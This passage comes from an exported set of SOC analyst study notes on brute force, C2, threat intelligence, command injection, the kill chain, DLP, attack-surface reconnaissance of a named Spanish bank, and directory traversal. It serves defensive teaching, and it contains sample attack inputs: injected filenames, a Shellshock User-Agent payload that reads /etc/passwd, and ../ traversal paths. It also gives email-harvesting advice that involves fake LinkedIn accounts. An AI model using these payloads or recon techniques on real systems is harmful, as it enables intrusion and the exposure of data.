expression will match any log file entry that includes a failed login attempt (401 or 403 status code) to the /login.php page. It will capture the IP address of the client making the request in the first capture group ((\\S+)). You can then use a log analysis tool or script to count the number of times each IP address appears in the log file and flag any IP addresses that have a high number of failed login attempts as potential brute force attackers. Also, you can update the regex’s IP address as suspicious IP source.\nIn this lesson, we have covered the Brute Forcing attack. We have talked about how the vulnerability appears, as well as the detection and the prevention methods."},"SOC/SOC-Analyst-Notes/C2":{"slug":"SOC/SOC-Analyst-Notes/C2","filePath":"SOC/SOC Analyst Notes/C2.md","title":"C2","links":["HTB/Reverse-Shell","Networking/DNS"],"tags":[],"content":"Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a Reverse Shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.\nCommon C2 Channels\n1. HTTP/HTTPS\nThe protocols HTTP on port 80 and HTTPS on port 443 - this type of beaconing blends the malicious traffic with the legitimate traffic and can help the attacker evade firewalls.  \n2. DNS\nThe infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as DNS Tunneling.\nImportant to note that an adversary or another compromised host can be the owner of the C2 infrastructure."},"SOC/SOC-Analyst-Notes/CTI-Lifecycle":{"slug":"SOC/SOC-Analyst-Notes/CTI-Lifecycle","filePath":"SOC/SOC Analyst Notes/CTI Lifecycle.md","title":"CTI Lifecycle","links":[],"tags":[],"content":"\nPlanning and Direction\nThe planning and directing phase should be the foundation of a structure that must function flawlessly. Planning is the part that allows us to find answers to questions such as what exactly is expected from intelligence, who will consume the intelligence obtained, and which teams or individuals will take action as a result of the intelligence obtained. Intelligence will be used by executives or a team of analysts. You can directly feed your SOC team with the intelligence obtained and/or present summary reports to your managers. At this point, what you want is important. Your requests will also clarify the scope of the intelligence. For example, an organization can determine the scope of intelligence it wants to obtain by asking the following questions:\nDoes your organization have a SOC team?\nThis question shows us whether there is a technical team that will actively use the intelligence obtained, and if there is, it is an indication that shows us we can go down to the technical details of the intelligence. If there is not a SOC team it indicates that the intelligence will be consumed by managers. In this case, an intelligence model that offers clearer and more understandable summaries can be taken as a basis, without being bogged down in technical details.\nHas your organization been attacked before? If so, what was the success rate of the attack?\nThe fact that the organization was exposed to a high rate of successful attacks can be used to reduce the success rate of future attacks by putting the intelligence on the basis of the established structure, and the intelligence obtained with the data collected from the current attacks. This tells us how often we will use intelligence in the organization. It controls how often we pull data from internal and external sources. It is important that the intelligence obtained is constantly updated and consumed quickly for frequently attacked organizations.\nDo the attacks target organization or individuals?\nIt is important to focus on the External Attack Surface Management area, which the intelligence contains, to make the threat surface as clear as possible and to follow it up regularly for attacks targeting the organization. External Attack Surface Management is to determine and manage the attack surface of organizations. It will be covered in detail in the following sections. For attacks targeting individuals, the Digital Risk Protection part is crucial. Digital Risk Protection defines the digital risks that organizations may face through the attack surface. It will be covered in detail in the following sections. It reveals that we need to clarify certain issues such as users’ login credentials, their risks to be exposed to phishing attacks, and defining the strength of your password policy.\nAre other companies in your industry exposed to the same attacks you received?\nThis question explains the need for us to turn to industry-based intelligence that provides us with intelligence about other companies in our industry. When other companies are getting attacked, industry-based intelligence provides us with the IOC (Indicators used to identify attacks digitally, and threat actors) related to that specific attack, and also it will allow us to avoid that attack with minimum damage if we are exposed to the same attack.\nInformation Gathering\nThe information collection stage is the part where we determine what sources we will collect data from. These resources can be both internal and external. Some of the sources we will collect data from are as follows:\n\n\nHacker Forums\n\n\nRansomware Blogs\n\n\nDeep/Dark Web Forums and Bot Markets\n\n\nPublic Sandboxes\n\n\nTelegram/ICQ/IRC/Discord/Twitter/Instagram/Facebook/LinkedIn\n\n\nSurface Web(Cybersecurity Blogs etc.)\n\n\nPublic Research Reports\n\n\nFile Download Sites\n\n\nGithub/Gitlab/Bitbucket etc.\n\n\nPublic Buckets (Amazon S3/Azure Blob etc.)\n\n\nShodan/Binary Edge/Zoomeye vb.\n\n\nSources that provide IOC (Alienvault, Abuse.ch, MalwareBazaar vb.)\n\n\nHoneypots\n\n\nSIEM, IDS/IPS, Firewalls\n\n\nPublic Leak Databases\n\n\nProcessing\nThe data obtained is processed at this stage which may be considered a filter. We clean the data from false positives as much as possible, pass it through certain rule sets, and subject it to some correlations. At the end of this process, we get the information we need.\nAnalysis and Production\nThe information obtained is interpreted and analyzed at this stage and the consumable intelligence is obtained as a result of the output of the analysis. After this point, appropriate reports are to be prepared according to who will consume the intelligence.\nDissemination and Feedback\nDissemination of the intelligence appropriately is the next step for whom the intelligence is intended. For example, intelligence from external sources to the technical team should be distributed to other users in the organization through appropriate channels, and the necessary feedback should be given to make the intelligence better and more efficient at the end of the whole process. Let’s say that content with the name of our organization is created through a site builder at the subdomain of letsdefend.blogspot.com. If the blogspot.com domain is marked as suspicious or harmful in the intelligence and not this subdomain, this will result in many false positives. In such cases, we need to improve the intelligence with feedback."},"SOC/SOC-Analyst-Notes/CTI-Types":{"slug":"SOC/SOC-Analyst-Notes/CTI-Types","filePath":"SOC/SOC Analyst Notes/CTI Types.md","title":"CTI Types","links":[],"tags":[],"content":"Types of Cyber ​​Threat Intelligence\nCyber ​​threat intelligence varies by position within the organization. The intelligence is divided into types since the threat intelligence the technical staff and the manager receive is not the same. The intelligence that the L1 SOC analyst and the SOC manager will receive will differ. This way the intelligence becomes more appealing to its final consumer.\n\nTechnical Cyber ​​Threat Intelligence\nTechnical CTI can be considered as the output of more technical analysis studies based on IOCs. It is an output of the technical CTI to create certain rulesets and to protect the organization against attacks by using a report containing hashes of malicious IP addresses, phishing domains, and malicious files, and by investigating the information obtained from this report. This type of intelligence is generally used by the technical personnel (SOC Analyst, Incident Responder) in the organization.\nTactical Cyber ​​Threat Intelligence\nTactical CTI is used to understand the TTP (Technical, Tactical, Procedure) of the attackers by trying to find answers to certain questions. For instance, we have an intelligence report containing the TTP of an attacker named “mordecai”. When we go over this report we should be able to find answers to questions like “what vulnerabilities does the attacker use the most?”, “in which countries does the attacker operate?”, “what is the attacker’s motivation?”, and “what methods does the attacker use?” to be able to protect our organization by taking precautionary measures against a possible attack. This intelligence is mostly provided for the management personnel (i.e. SOC Manager, etc.) who are leading the technical teams.\nOperational Cyber Threat Intelligence\nOperational CTI is often confused with Tactical CTI because they have so much in common. Operational CTI also focuses on the attackers’ TTPs just like Tactical CTI but it is mostly used for Threat Hunting, unlike tactical CTI. While tactical CTI is a more automated process, operational CTI can focus on a specific type of attack, or a single attacker in particular, and carry out the investigation to a narrower scope. This type of intelligence can be used by Security Managers or Threat hunting personnel in the organization.\nStrategic Cyber ​​Threat Intelligence\nStrategic CTI is for the top executives of the organization. It is generally used for long-term tasks such as product purchasing, budgeting, and planning for the organization in the long run by weighing the tactical CTI outputs."},"SOC/SOC-Analyst-Notes/Command-Injection":{"slug":"SOC/SOC-Analyst-Notes/Command-Injection","filePath":"SOC/SOC Analyst Notes/Command Injection.md","title":"Command Injection","links":[],"tags":[],"content":"What are Command Injection Attacks?\nCommand injection attacks are attacks that occur when data received from a user is not sanitized and is passed directly to the operating system shell.\n\nAttackers exploit command injection vulnerabilities to execute commands directly on the operating system. Since the attacker’s priority is to take control of the system, these vulnerabilities are more critical than other vulnerabilities.\nA misconfigured web application would grant the attacker access with admin rights because the command the attacker sends uses the rights of the web application user.\nHow does Command Injection work?\nCommand injection vulnerabilities occur when the data received from the user is not sanitized. Let’s examine command injection vulnerabilities with an example.\nSuppose we have a basic web application that copies the user’s file to the “/tmp” folder. The web application code is shown below:\n\nUnder normal circumstances, if used correctly, the application will work normally. For example, if we upload a file called “letsdefend.txt”, it will successfully copy the file to the “/tmp” folder.\nSo what if we upload a file called “letsdefend;ls;.txt”? The command would be:\nCommand: cp letsdefend;ls;.txt\nThe ”;” indicates that the command has ended. So if we look at the payload above, there are three different commands that the operating system executes. These are:\n\ncp letsdefend\nls\n.txt\n\n\nThe first command is for the copying process, but if the parameters are not entered correctly it will not work correctly.\nCommand #2 is the directory listing command that the attacker wants to execute. The user does not receive the command output, so the attacker cannot see the files in the directory, but the operating system successfully executes the command.\nIf the operating system tries to run command number 3, it will get an error message because there is no “.txt” command.\nAs you can see, the code has been executed in the web server’s operating system. So what if the attacker were to upload a file called “letsdefend;shutdown;.txt”? The operating system would shut down and the web application would not be able to function.\nWith the correct payload, the attacker can create a reverse shell in the operating system.\nHow attackers can exploit Command Injection Attacks\nAttackers can execute commands on an operating system by exploiting command injection vulnerabilities. This means that the web application and all other components on the server are at risk.\nHow to Prevent Command Injection\n\nAlways sanitize data you receive from a user: Never trust anything you receive from a user. Not even a file name!\nLimit user privileges: Whenever possible, set web application user rights at a lower level. Few web applications require users to have administrator rights. \nUse virtualization technologies such as dockers.\n\nDetecting Command Injection Attacks\nSo how do we detect command injection attacks?\nActually, there is more than one way. These are:\n\nWhen examining a web request, look at all areas: The command injection vulnerability may be in different areas depending on how the web application works. Therefore, you should check all areas of the web request.\nLook for keywords related to the terminal language: Check the data received from the user for keywords related to terminal commands such as dir, ls, cp, cat, type, etc.\nLearn about commonly used command injection payloads: When attackers discover a command injection vulnerability, they usually create a reverse shell to make their work easier. Therefore, knowing commonly used command injection payloads will make it easier to detect a command injection attack.\n\nA Detection Example\nIn this example, we will not be looking at access logs, but instead at an HTTP request.\n\nGET / HTTP/1.1\nHost: yourcompany.com\nUser-Agent: () { :;}; echo “NS:” $(&lt;/etc/passwd)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nLooking at the HTTP request above, we can see that the main page of the web application yourcompany[.]com was requested.\nBut if we look at the HTTP request headers, we see a suspicious situation in the User-Agent header. There is a bash command in the User-Agent header where there should be browser/operating system information.\nIn fact, this request was captured while a security vulnerability called Shellshock was being exploited. Shellshock is a security vulnerability that was disclosed in 2014 and had a major impact.\nShellshock comes from bash somehow executing environment variables unintentionally. It is a great example of a command injection attack.\nThe contents of the file “/etc/passwd” are returned to the attacker as “NS” in the HTTP response header when the bash command, which is in the user agent, is executed."},"SOC/SOC-Analyst-Notes/Cyber-Kill-Chain":{"slug":"SOC/SOC-Analyst-Notes/Cyber-Kill-Chain","filePath":"SOC/SOC Analyst Notes/Cyber Kill Chain.md","title":"Cyber Kill Chain","links":["SOC/SOC-Analyst-Notes/Reconnaissance","SOC/SOC-Analyst-Notes/Phishing","SOC/SOC-Analyst-Notes/Watering-Hole","Zero-day","SOC/SOC-Analyst-Notes/Backdoor","HTB/Web-Shell","web-shell","HTB/Services","SOC/SOC-Analyst-Notes/Timestomping","SOC/SOC-Analyst-Notes/Masquerading","SOC/SOC-Analyst-Notes/C2","SOC/SOC-Analyst-Notes/Unified-Kill-Chain"],"tags":[],"content":"The Cyber Kill Chain framework is designed for identification and prevention of the network intrusions. The term kill chain is used in military to refer to the steps taken by an adversary to reach its ultimate goal.\nA typical cyber kill chain looks like:\nThe Cyber Kill Chain\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system.\n\n2. Weaponization\nIn this step, the threat actor combines malware and exploit into a deliverable payload. Most attackers usually use automated tools to generate the malware or refer to the Dark Web to purchase the malware.\n\n3. Delivery\nThe delivery of the Weapon can be performed through plenty of ways:\n1. Phishing emails\n2. Delivering malicious urls\n3. Watering Hole attack\n\n4. Exploitation\nExploitation is the step in which the payload is run in the victim system and vulnerabilities are exploited. The malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network.\nSome examples of exploitation are:\n1. Zero day exploit\n2. Exploit software, hardware or even human exploit\n3. Server based exploit\n\n5. Installation\nOnce the system is exploited, the attacker will install a persistent Backdoor in the system. This persistence can be achieved through various methods:\n1. Installing a Web Shell\nA web shell, because of its simplicity, can be well hidden and difficult to get rid of. Hence, it serves as an excellent Backdoor for an attacker.\n2. Windows Services\nWindows service run in background and can be modified to execute a malicious script or payloads. Adversary may create, or modify a windows service to execute payloads under a service name related to the OS or legitimate software.\n3. Run keys\nAdding the entry to the “run keys” for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer.\n4. Installing a Backdoor\nAdversary may install other backdoors such as Meterpreter’s Backdoor, to later gain access to the system.\nIn this phase, the attacker can also use the Timestomping and Masquerading techniques to avoid detection by the forensic investigator and hide the malware.\nThe defenders\nThe fact that an attacker who reached this stage is performing malicious activities on the systems indicates that the attacker cannot be detected. Therefore, whether the attacker is present or not, the SOC team should manage and execute security operations under the assumption that there is always an attacker present in the system.\n\n6. Command and Control (C2)\nNow the system has been compromised and a Backdoor has been installed. But the attacker stills needs a way to communicate with the compromised system and that also without being detected. Here comes the role of C2 Server. With C2 server the attacker can easily control the host.\n\n7. Exfiltration\nNow the adversary finally execute their objective which may be stealing data, destroying data, continuing lateral movement, etc.\n\nNext: Unified Kill Chain"},"SOC/SOC-Analyst-Notes/Cyber-Threat-Intelligence":{"slug":"SOC/SOC-Analyst-Notes/Cyber-Threat-Intelligence","filePath":"SOC/SOC Analyst Notes/Cyber Threat Intelligence.md","title":"Cyber Threat Intelligence","links":["SOC/SOC-Analyst-Notes/CTI-Lifecycle","SOC/SOC-Analyst-Notes/CTI-Types","SOC/SOC-Analyst-Notes/Determining-the-Attack-Surface","SOC/SOC-Analyst-Notes/Gathering-Threat-Intelligence","SOC/SOC-Analyst-Notes/Using-Threat-Intelligence"],"tags":[],"content":"Cyber ​​threat intelligence (CTI) is a cyber security discipline that aims to produce actionable output after processing and interpreting the data collected from multiple sources, and to inform organizations against cyber attacks through these outputs to minimize damages.\nCTI basically aims to understand the Techniques, Tactics and Procedures (TTPs) of attackers. CTI means to collect data from multiple sources (IOCs etc.) and processes this data to create information. Organization-specific intelligence can be produced by matching the information related to specific organizations. CTI is a field that keeps constantly changing and evolving by its nature. This change is an inevitable reflection of the cyber security industry. It is possible to explain this field, which keeps up with the change, with certain processes.\nIndex\n1. CTI Lifecycle\n2. CTI Types\n3. Determining the Attack Surface\n4. Gathering Threat Intelligence\n5. Using Threat Intelligence"},"SOC/SOC-Analyst-Notes/Data-Loss-Prevention":{"slug":"SOC/SOC-Analyst-Notes/Data-Loss-Prevention","filePath":"SOC/SOC Analyst Notes/Data Loss Prevention.md","title":"Data Loss Prevention","links":[],"tags":[],"content":"What is Data Loss Prevention (DLP)?\nData Loss Prevention (DLP) is a technology that prevents sensitive and critical information from leaving the institution.\nTypes of DLP\nDLP products fall into several types:\n\nNetwork DLP\nNetwork DLP is responsible for taking security actions related to leaving critical and sensitive information on the network outside the organization. For example, the DLP product may block a connection that is attempted to upload a file to an FTP server, request it to be audited, or forward it as a log to the relevant security solution. The action to be taken by the DLP product varies according to its configuration. Additionally, it can report suspicious activity to the administrator.\nEndpoint DLP\nUnlike Network DLP, Endpoint DLP monitors activities on a particular device rather than packet flow within the network. The Endpoint DLP product is installed on the device and after installation, it manages suspicious activities on the device. Endpoint DLP is essential for protecting critical and sensitive information on the devices of remote personnel. For example, an Endpoint DLP product can see whether sensitive information is kept in encrypted form in the device.\nCloud DLP\nCloud DLP is used to prevent sensitive data from leaking over the cloud by working with certain cloud technologies. It is responsible for ensuring that corporate personnel can use cloud applications comfortably without data breaches or loss.\nHow does DLP work?\nWhen DLP detects data in the right format according to the rules defined for it, it blocks the action taken or tries to ensure the security of the transmission by encrypting the data. For example, credit card numbers have a certain format, and when the DLP product in the email content sees the credit card number per this format, it will take the relevant action. The following image shows how DLP works in a basic sense:\n\nThe Importance of DLP for Security\nToday, critical information disclosure is a frequently encountered situation in organizations. It is one of the factors that should be considered, as this situation can have many bad effects. The DLP product is one of the security products that should be used for institutions with critical information, just like other security solutions.\nSome popular DLP products used within the cybersecurity industry are as follows:\n\nForcepoint\nMcAfee\nTrend Micro\nCheckpoint\nSymantec\n"},"SOC/SOC-Analyst-Notes/Determining-the-Attack-Surface":{"slug":"SOC/SOC-Analyst-Notes/Determining-the-Attack-Surface","filePath":"SOC/SOC Analyst Notes/Determining the Attack Surface.md","title":"Determining the Attack Surface","links":[],"tags":[],"content":"The Importance of Attack Surface in Threat Intelligence\nToday, classical threat intelligence models are falling short. The concept of External Attack Surface, which has recently entered the literature, has shown us this inadequacy and has closed the deficiencies. This concept has brought a new perspective to threat intelligence. The concept of Extended Threat Intelligence (XTI) has gained more popularity apart from classical intelligence. To define, XTI, unlike CTI, creates an attack surface belonging to the organization in order to produce intelligence specific to the organization. Thanks to this attack surface, organizations gain visibility. This visibility can be a forgotten endpoint or a forgotten subdomain. The main interest at this point is that organizations now know their inventories and clearly know which assets to defend against.\nDetermining the Attack Surface\nWhen creating the attack surface, domains, subdomains, websites, login pages, CMS applications, technologies used on websites, IP addresses, IP blocks, DNS records, C-level employee mails, network applications, operating systems, bin numbers, and swift codes, and SSL certificates will be included. We will determine all these by proceeding through the main domain, which was provided to us by the organization as per the scenario.\nDomains\nThe only information that will be given to us in the first place will be the primary domain of the organization. We will try to create the entire entity structure over this domain. In the sample scenario below, an asset inventory of Abanca, a bank located in Spain, will be created.\nMain Domain: abanca.com\nRelated Domains:\nIn order to find other domains of the company, we can find domains that provide redirects to the main domain. We can use the host.io service for this. Host.io will provide us with all the domains hosted on the same IP, the domains hosting the relevant domain within the website, and other domains hosted by the relevant domain within the website, apart from other domains that provide redirection to the relevant domain. Not all domains obtained may belong to the organization. We can decide which domains belong to the organization and which ones don’t by checking the whois outputs of the domains or by looking at their content.\n\nWhen we search the abanca.com domain on host.io, we can also see other domains hosted on the same IP address in the “Co-Hosted” section.\n\nIn a subsection, we can view other domains that contain our relevant domain, and after making the necessary verifications, we can include these domains in our asset list.\n\nIn the “Links to” section, we can view other domains that our domain hosts within the website.\n\nIn the Redirects section, we can view other domains directed to our domain.\nSince the number of domains displayed on the screen is limited, we can obtain all domains via the API by becoming a member.\nAs a secondary method, we can find similar information in whois records of the primary domain we are working on by performing a Reverse whois lookup (Reverse by Org Name, reverse by Registrant Mail, etc.) for certain information.\n\nFor example, when we look at the whois information of the abanca.com domain, we see that the organization section contains the name of the company. We will be able to see all other domains registered under this organization name when we reverse the organization name. We will use the reverse whois tool at viewdns.info for this.\n\n266 domains containing this name are displayed when we searched “ABANCA” in the search section. These domains are potentially our domains. After we verify each one, we can add it to our inventory.\n\nAlternatively, we can use the whoxy.com tool to do the same check. With this tool, we can reverse whois in 4 categories with the help of this tool.\nAs a third method, we can examine the DNS records of the relevant domain and reach other domains using the same DNS records, check these domains and add them to our inventory after verification.\nWe can check the DNS records with the “dig” command on the command line or we can use the tools that work online on the internet. In this example, we are viewing DNS records using the dnslytics.com tool. In order to discover potential domains, we need to reverse records that are managed by the organization. For example, a shared nameserver belonging to any hosting company hosts too many domains, and these domains mostly do not belong to us. Therefore, it is useful to examine the records of the mail server or nameserver that belongs to the organization. In this example, the ns2.abanca.com record stands out. When the related nameserver is reversed on the same tool, it shows that 98 other domains are hosted on this nameserver.\n\nAll the domains that are listed here are potentially our own, as they are hosted on our own nameserver. After performing the verification, we can add them to our inventory.\nSubdomains\nThere are many tools that are available online or on the command line to find subdomains. We will now use 4 of them. These tools are SecurityTrails, Aquatone, Sublist3r, and Assetfinder.\nSecurityTrails can be used on the command line via the hacktrails tool or API or queries can be made from the visual interface. It produces high-quality output.\nsecuritytrails.com/list/apex_domain/abanca.com\n\nSecondly, the Sublist3r tool runs on the command line and finds and outputs findings from multiple sources. It is run with the command in the screenshot.\n\nThirdly, “Aquatone” collects data and produces output by querying from multiple sources, just like the Sublist3r tool. If you enter the necessary API keys in the configuration files for the resources that require API keys, the number of subdomains it finds will increase. Aquatone can check the activity status of the subdomains it finds with the help of the scan module it contains, and it can check whether there is a takeover vulnerability on the subdomains it finds with the help of the takeover module it has.\n\nFinally, with the “assetfinder” tool, you can query subdomains and obtain data from many sources.\n\nOne of the most important points when searching for a subdomain is to get as much data from as many sources as possible. After collecting and bringing all the data together, we will have a fairly large list of subdomains.\nWebsites\nIn order to find the websites, we need to send requests to the domains and subdomains we find. We obtain our active websites by examining the domains or subdomains that respond to our HTTP/HTTPS requests.\n\nAs you can see in the above screenshot, when we list all of our domains and scan them on the “httpx “ tool, it will list all the domains that respond to our http/https requests. As an alternative to “httpx” tool you can also use “httprobe” tool which is a tool that will meet your needs with similar functions.\nLogin Pages\nDetecting websites with login screens is a bit more challenging than usual. If you wish, you can go through the websites you find manually and separate those with a login screen and list them together. Since this process requires complete manpower, it will be an unnecessary and time-consuming process. Instead, this can be done with some simple scripts. The “python” language is a perfect fit for this process. Thanks to the many libraries it contains, we can do this with very few lines of code with very little effort. We can detect the login pages by sending requests to the websites we have and searching for clues for the login pages in the content of the returned response by using the requests and BeautifulSoup libraries in python. For this process, we first need to check the background code of the login page and look for some indicators that will give us a clue about whether there is a login page or not. We can simply look for answers to the following sample questions and try to figure out whether the page is a login page or not with the indicators and answers we have obtained:\n\n\nIs the word “Login” or its corresponding phrase in any language possible on the page?\n\n\nAre form tags used on the page?\n\n\nAre there expressions such as “Username” or “Password” in the placeholder section of the input fields on the page?\n\n\nAre there “Login” or similar expressions in the title or header of the page?\n\n\nIn short, if the script we wrote parses the content in the response to answer these questions, we can detect most of the login pages in a short time.\nTechnologies Used on Websites\nThe technologies used on the websites we detect will make an important contribution to us, especially in terms of vulnerability intelligence. For example, after we determine the CMS and the version used on a website, we can take quick action on the remediation if there is any matching vulnerability found in the product and the version used on the website in the CVEs we pull from our intelligence sources. There are multiple tools and manual methods to detect the technologies used on the websites. We will use soy.abanca.com/, one of the websites we have identified for testing purposes. First of all, we install the “Wappalyzer” tool (chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg) in our browser in the Chrome Web Store. After opening soy.abanca.com on our browser, we click on the “Wappalyzer” tool icon in the upper right corner, the application gives us as much as it detects in terms of the technologies used on the page.\n\nAs you can see in the screenshot above, the content management system has listed all the information about the database and the libraries used as much as it can detect. “Whatruns”, “BuiltWith” and “Whatcms” applications can be used as an alternative to the Wappalyzer tool.\n\n\nThe above screenshots show that “Whatruns” and “BuiltWith” tools are installed as browser add-ons and work just like “Wappalyzer” tool.\n\nUnlike other tools, “Whatcms” is an online tool and it is available at whatcms.org. All you need to do is to enter the URL address you want to scan, and it will display the detections.\nIf you want to detect it manually rather than using a tool, you can examine the source code of the page and make a technology detection by viewing the file paths of the theme belonging to the content management system and the libraries given in the code, especially in the script tags.\n\nAnother tool-independent method would be to examine the header of the response returned from the page from the developer console. We can display information about the technologies used on the page within the header of the returned responses.\n\nIP Addresses\nIP addresses are one of the most important assets of our organization. There are serious risks involved when open ports on IP addresses are not checked regularly or if the ports are still used after the services running on these ports are outdated. Therefore, the monitoring of these ports and services and detecting the risks involved in a timely manner is vital for a network. We can make a list by analyzing the IP addresses of the domains and subdomains we found. In order to detect these IPs, we can collect the A records of the domains or detect the IP addresses by sending a request and resolving it. In addition, in order to detect all the active IP addresses contained in the IP blocks used within the organization, we can send requests to all the IPs in the block and select the active ones.\nIP Blocks\nSince IP blocks contain mostly the IPs owned by the organization, the IPs with the highest risk are within these blocks. Therefore, follow-up of these is very important. We can detect IP blocks by looking for patterns in the IP addresses we obtained from the domains and checking the whois information of consecutive IP addresses to understand whether they belong to the organization or not.\nAs a secondary method, we can search for the keywords of our organization by using the org parameter on Shodan. The org parameter is a search parameter used for the organization part of the IP addresses. For instance when we search for org:“Abanca” it will list the IP addresses with the word Abanca in the organization section. By examining these IP addresses, we can look at their whois information and find out whether they belong to the organization and which block they belong to.\n\nIn addition to Shodan, alternatives such as Binaryedge and Zoomeye can be used.\nLastly, you can also detect blocks by using online tools that make IP block associations over bgp.he.net and similar domain or IP addresses.\n\nDNS Records\nMonitoring DNS records is important for detecting unknown DNS record changes. You can use Google’s online dig tool or use websites like dnslytics.com to detect DNS records. In addition, DNS records can also be accessed with the dig command on the command line.\nC-Level Employee Mails\nFor senior executives, email compromises may result in disaster. The data that’s transmitted within the mail traffic on a daily basis is crucial for the organization. Therefore, it is very important to monitor corporate email traffic as well as personal emails.\n\n\n\n\nThere are several tools that are frequently used to detect these e-mails. We recommend using a fake Linkedin account and a fake email address when using the tools. These tools work as chrome extensions. You can download the extensions from the Chrome Web Store or download them from their website and import them into chrome. These applications include “SalesQL”, “RocketReach”, “Apollo”, and “ContactOut”. All extensions work in the same logic. Basically, we just go to the person’s Linkedin profile and click on the extension. Extensions will list us the e-mail addresses they can detect.\nNetwork Applications and Operating Systems\nOne of the most important steps for us to be able to track vulnerabilities actively or passively is to find all the applications and operating systems. All the methods mentioned in item 5 are also valid in this section. In addition, in this section, we can collect discovered services by querying our IP addresses via shodan with passive scanning or we can detect them via active scanning. Network applications and operating system detections can be made according to the responses to the requests we sent to the open ports of our previously removed IP addresses in our asset list\n\nBin Numbers and Swift Codes\nBin numbers and swift codes are one of the most important assets to be monitored for matters such as the detection of stolen credit cards on the intelligence side, which are of particular interest to fraud teams in banks. We will use public databases designed for the detection of bin numbers and Swift codes. There is more than one database to find the bin numbers of an organization. Some of those are sites like “bincheck.io”, “freebinchecker.com”, “bintable.com”.\n\nFor example, we can list the bin numbers of Abanca on the bincheck.io site by filtering the country and the bank names, as seen above. Other databases work in a similar way. There are sites such as “wise.com”, “bank.codes”, “theswiftcodes.com” to detect Swift codes. We can also obtain swift codes by making bank-based inquiries on these sites.\n\nSSL Certificates\nSSL certificates are one of the most important factors for secure communication. Therefore, we need to determine carefully if there is an SSL certificate on the domains we have detected and add it to our asset list. It is possible to collect SSL certificates manually on the site, but we prefer to use some tools to make it easier since this is a time-consuming process. The most common tools are “Censys” and “crt.sh”.\n\nFor example, the above screenshot shows that we are able to list all the certificates that contain the abanca.com domain on Censys. We can also search for the abanca.com domain on crt.sh, and it lists all the certificates with abanca.com in it.\n\nWe can collect the SSL certificates quickly and easily using these tools."},"SOC/SOC-Analyst-Notes/Directory-Traversal-Attack":{"slug":"SOC/SOC-Analyst-Notes/Directory-Traversal-Attack","filePath":"SOC/SOC Analyst Notes/Directory Traversal Attack.md","title":"Directory Traversal Attack","links":[],"tags":[],"content":"What is Directory Traversal?\nDirectory traversal is an attack type that the attackers leverage often to access files and directories that are stored outside the web server’s root directory. It involves manipulating input to be able to access files on a web server that are actually not intended to be accessible by unauthorized users. This type of attack is also known as the “dot-dot-slash” attack, and it can be used to gain unauthorized access to sensitive data or execute arbitrary code on a web server.\nFor example, let’s say a web application uses the following URL to display user profile pictures:\nexample.com/profiles/picture.php\nAn attacker can leverage directory traversal attack to access files outside of the intended directory by adding ../ to the URL. For instance, they could use the following URL to access a file outside of the profiles directory: example.com/profiles/picture.php\nThis would give the attacker access to sensitive system files, such as the password file.\nActually, at first look, it’s pretty similar to a Local File Inclusion vulnerability. The main difference between the directory traversal and LFI is the source of the input. Directory traversal involves in manipulating the input that is used to access files on a web server, whereas LFI involves in manipulating input that is used to include local files within a web application.\nIn a local file inclusion vulnerability, an attacker can use user input to include a file from the local file system into the web application. This can allow the attacker to execute arbitrary code on the server to access the sensitive data.\nFor example, consider a web application that includes a file based on user input, such as include($_GET[‘page’]). An attacker could manipulate the page parameter to include a sensitive file on the server, such as ../../../../etc/passwd. This would allow the attacker to read the password file and gain unauthorized access to the system.\nIn contrast, directory traversal vulnerabilities allow attackers to access files outside of the web application’s root directory. This can also allow them to execute arbitrary code or access sensitive data, but the attack vector is different.\nDirectory Traversal Possible Vectors\nDirectory traversal attacks can occur through various attack vectors, including:\n\nUser input: Attackers can manipulate user input parameters, such as URLs, file paths, and form fields, to access files outside of the intended directory. This can be done by adding “../” or other special characters to the input.\nCookies: If a web application stores user data in cookies, attackers can try to manipulate the cookie value to access files outside of the intended directory.\nHTTP headers: Attackers can manipulate HTTP headers, such as the Referer or User-Agent header, to access files outside of the intended directory.\nFile upload: If a web application allows file uploads, attackers can upload malicious files that contain directory traversal attacks.\nDirect requests: Attackers can try to access files and directories directly by guessing or brute-forcing the file names or paths.\nURL manipulation: Attackers can try to manipulate the URL of a web application to access files outside of the intended directory. For example, they can add ”/../” to the URL to go up one directory level.\nMalicious links: Attackers can send users malicious links that contain directory traversal attacks. When the user clicks on the link, the attack is executed on their computer.\n\nHow Directory Traversal Works?\nHere’s an example of vulnerable code that is susceptible to directory traversal attacks in a PHP script:\n\nIn this example, the script takes a file name as a parameter from the user input using the $_GET method. The script then concatenates the user input with the document root directory to form a full path to the file.\nHowever, this code is vulnerable to directory traversal attacks since an attacker can manipulate the file parameter to include ../ characters, which will allow them to access files outside of the intended directory. For example, an attacker could use the following URL to access the /etc/passwd file on the server:\n\nImpact of Directory Traversal\nThe impact of a directory traversal attack can be severe, depending on the files and directories that the attacker can access.\nAttackers who successfully exploits a directory traversal vulnerability can view, modify, or delete files that they are not authorized to access. This can lead to a variety of security risks and attacks, including:\n\nDisclosure of sensitive data: An attacker can access sensitive files, such as password files, configuration files, and user data, which can be used for identity theft, fraud, or other malicious activities.\nExecution of arbitrary code: An attacker can upload and execute malicious files that contain commands or code that can harm the system, such as malware or backdoors.\nDenial of service: An attacker can delete critical files or cause a system to crash, resulting in a denial of service attack.\nSystem compromise: An attacker who gains access to system files or directories can use\n\nPrevention Methods for Directory Traversal Attacks\nHere are some best practices to prevent directory traversal attacks in web applications:\n\n\nInput validation and sanitization: Validate and sanitize all user input, especially the file paths and the directory names. This can involve using regular expressions or other methods to check the input for valid characters, and to limit the input to known values or directories.\n\n\nAccess controls: Limit the web server’s access to only the files and directories required for the application to function. Use file the system permissions and access controls to restrict access to sensitive files and directories.\n\n\nRelative file paths: Use relative file paths instead of absolute paths whenever possible. This can prevent attackers from using the “../” character to navigate up to higher-level directories.\n\n\nWhitelisting: Use a whitelist approach where only specific characters are allowed in the file name parameter. This can be done using a validation library or a custom validation function.\n\n\nSecure coding 